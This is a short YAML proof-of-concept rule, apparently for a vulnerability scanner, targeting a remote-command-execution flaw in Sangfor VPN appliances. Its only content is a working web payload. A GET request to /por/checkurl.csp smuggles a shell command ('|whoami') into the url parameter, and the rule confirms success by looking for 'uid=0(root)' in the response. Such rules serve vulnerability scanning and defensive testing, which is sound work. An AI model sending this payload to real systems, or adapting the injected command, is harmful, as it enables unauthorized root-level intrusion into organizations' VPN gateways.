name: poc-yaml-sangfor-vpn-rce
rules:
  - method: GET
    path: /por/checkurl.csp?timeout=1&retry=1&url=-h|whoami
    follow_redirects: false
    expression: 
      response.status == 200 && response.body.bcontains(b"uid=0(root)")
